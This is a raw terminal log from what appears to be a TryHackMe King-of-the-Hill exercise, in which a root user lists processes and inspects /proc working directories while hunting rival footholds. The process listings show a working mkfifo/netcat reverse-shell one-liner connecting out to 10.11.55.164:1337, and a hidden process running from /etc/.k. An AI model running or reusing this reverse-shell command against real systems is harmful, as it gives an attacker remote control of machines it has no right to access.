mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:28 /li
root      7342  3.0  1.2 722556 12596 ?        Ssl  23:10   0:00 /usr/bin/systemd-pam
kill -9 1362
-i: line 150: kill: (1362) - No such process

ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18480 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18796  3572 ?        S    23:00   0:00      |   \_ -i
root      7454  0.0  0.3  37080  3424 ?        R    23:11   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5196 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24908 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:29 /li
root      7342  0.4  1.3 722556 13588 ?        Ssl  23:10   0:00 /usr/bin/systemd-pam
ls -la /proc/1362/cwd
ls: cannot access '/proc/1362/cwd': No such file or directory

ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18480 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18796  3572 ?        S    23:00   0:00      |   \_ -i
root      7504  0.0  0.3  37080  3364 ?        R    23:11   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5196 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24908 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ds   23:00   0:29 /li
root      7342  0.2  1.3 722556 13588 ?        Ssl  23:10   0:00 /usr/bin/systemd-pam
ls -la /proc/7342/cwd
lrwxrwxrwx 1 root root 0 Dec  8 23:11 /proc/7342/cwd -> /
cd /
ls -lah
total 1.9G
drwxr-xr-x  24 root root 4.0K Mar 19  2020 .
drwxr-xr-x  24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x   2 root root 4.0K Mar 20  2020 bin
drwxr-xr-x   3 root root 4.0K Mar 20  2020 boot
drwxr-xr-x   2 root root 4.0K Mar 19  2020 cdrom
drwxr-xr-x  17 root root 3.7K Dec  8 22:31 dev
drwxr-xr-x  95 root root 4.0K Dec  8 23:00 etc
drwxr-xr-x   8 root root 4.0K Dec  8 23:00 home
lrwxrwxrwx   1 root root   33 Mar 19  2020 initrd.img -> boot/initrd.img-4.15.0-91-generic
lrwxrwxrwx   1 root root   33 Mar 19  2020 initrd.img.old -> boot/initrd.img-4.15.0-91-generic
drwxr-xr-x  22 root root 4.0K Dec  8 22:34 lib
drwxr-xr-x   2 root root 4.0K Aug  5  2019 lib64
drwx------   2 root root  16K Mar 19  2020 lost+found
drwxr-xr-x   2 root root 4.0K Aug  5  2019 media
drwxr-xr-x   2 root root 4.0K Aug  5  2019 mnt
drwxr-xr-x   2 root root 4.0K Aug  5  2019 opt
dr-xr-xr-x 109 root root    0 Dec  8 22:31 proc
drwx------   4 root root 4.0K Dec  8 23:04 root
drwxr-xr-x  26 root root  880 Dec  8 22:32 run
drwxr-xr-x   2 root root  12K Mar 20  2020 sbin
drwxr-xr-x   4 root root 4.0K Mar 19  2020 snap
drwxr-xr-x   2 root root 4.0K Aug  5  2019 srv
-rw-------   1 root root 1.9G Mar 19  2020 swap.img
dr-xr-xr-x  13 root root    0 Dec  8 23:05 sys
drwxrwxrwt  10 root root 4.0K Dec  8 23:00 tmp
drwxr-xr-x  10 root root 4.0K Aug  5  2019 usr
drwxr-xr-x  13 root root 4.0K Dec  8 23:01 var
lrwxrwxrwx   1 root root   30 Mar 19  2020 vmlinuz -> boot/vmlinuz-4.15.0-91-generic
lrwxrwxrwx   1 root root   30 Mar 19  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-91-generic
ls -lah /proc/*/cwd
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/1/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/10/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/100/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/11/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/117/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/12/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/13/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/14/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1425/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/15/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1544/cwd -> /
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1549/cwd -> /home/bread
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1556/cwd -> /home/bread
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1557/cwd -> /tmp
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1558/cwd -> /home/bread
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1563/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1575/cwd -> /etc/.k
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1591/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/16/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/167/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/17/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/18/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/19/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/2/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/20/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/21/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/22/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/23/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/24/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/25/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/26/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/263/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/27/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/28/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/29/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/30/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/31/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/316/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/317/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/32/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/33/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/36/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/367/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/37/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/38/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/397/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/399/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/4/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/402/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/403/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/404/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/405/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/406/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/408/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/417/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/419/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/421/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/4676/cwd -> /
lrwxrwxrwx 1 systemd-timesync systemd-timesync 0 Dec  8 22:32 /proc/508/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/6/cwd -> /
lrwxrwxrwx 1 systemd-network  systemd-network  0 Dec  8 22:32 /proc/610/cwd -> /
lrwxrwxrwx 1 systemd-resolve  systemd-resolve  0 Dec  8 22:32 /proc/623/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/7/cwd -> /
lrwxrwxrwx 1 tryhackme        tryhackme        0 Dec  8 22:32 /proc/729/cwd -> /home/tryhackme
lrwxrwxrwx 1 root             root             0 Dec  8 23:11 /proc/7342/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/743/cwd -> /
lrwxrwxrwx 1 bread            bread            0 Dec  8 22:32 /proc/745/cwd -> /home/bread
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/747/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/751/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/753/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/755/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/756/cwd -> /var/spool/cron/atjobs
lrwxrwxrwx 1 root             root             0 Dec  8 23:11 /proc/7578/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/763/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/788/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/789/cwd -> /root
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/791/cwd -> /var/spool/cron
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/792/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/8/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/80/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/800/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/809/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/81/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/815/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/816/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/819/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/82/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/83/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/84/cwd -> /
lrwxrwxrwx 1 mysql            mysql            0 Dec  8 22:32 /proc/841/cwd -> /var/lib/mysql
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/85/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/9/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/91/cwd -> /
lrwxrwxrwx 1 ramen            ramen            0 Dec  8 22:32 /proc/956/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/966/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:11 /proc/self/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:11 /proc/thread-self/cwd -> /
cd /tmp
ls -la
total 40
drwxrwxrwt 10 root  root  4096 Dec  8 23:00 .
drwxr-xr-x 24 root  root  4096 Mar 19  2020 ..
drwxrwxrwt  2 root  root  4096 Dec  8 22:31 .ICE-unix
drwxrwxrwt  2 root  root  4096 Dec  8 22:31 .Test-unix
drwxrwxrwt  2 root  root  4096 Dec  8 22:31 .X11-unix
drwxrwxrwt  2 root  root  4096 Dec  8 22:31 .XIM-unix
drwxrwxrwt  2 root  root  4096 Dec  8 22:31 .font-unix
prw-r--r--  1 bread bread    0 Dec  8 23:11 f
drwxr-xr-x  3 root  ramen 4096 Dec  8 22:33 screens
